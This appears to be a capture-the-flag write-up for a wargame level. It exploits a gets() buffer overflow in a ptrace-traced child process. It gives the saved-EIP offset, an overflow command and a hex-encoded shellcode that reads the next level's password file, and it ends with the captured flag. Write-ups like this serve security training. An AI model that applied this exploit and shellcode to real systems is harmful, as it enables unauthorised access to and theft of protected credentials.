# Level4
There is a fork in the program, if the program is the child, it calls gets on a buffer. So we can overflow and write a shellcode on the stack.

We found out that the old eip of the child is at 156 bytes from the beginnig of the buffer.

So now we can write a shellcode in the env.
```bash
./level04 <<< `python -c 'print("a" * 156 + "\x01\x01\xff\xff")'`
```
The child is trace with ptrace, and the parent doesn't allow the child to use an exec call.
So the next problem is that we can not use our last shellcode...
Then we re-write a new shellcode from asm, which will open a file, read it and write its content.

```bash
 export SHELLCODE=`python -c 'print("\x90" * 0xffff + "\xeb\x35\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x05\x5b\xcd\x80\x89\xc6\x89\xd9\x31\xd2\x31\xc0\x89\xf3\xb0\x03\x83\xec\x29\x8d\x0c\x24\xb2\x29\xcd\x80\xb0\x04\x31\xdb\xb3\x01\xb2\x29\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xc6\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73"
)'`
```

Flag is **3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN**
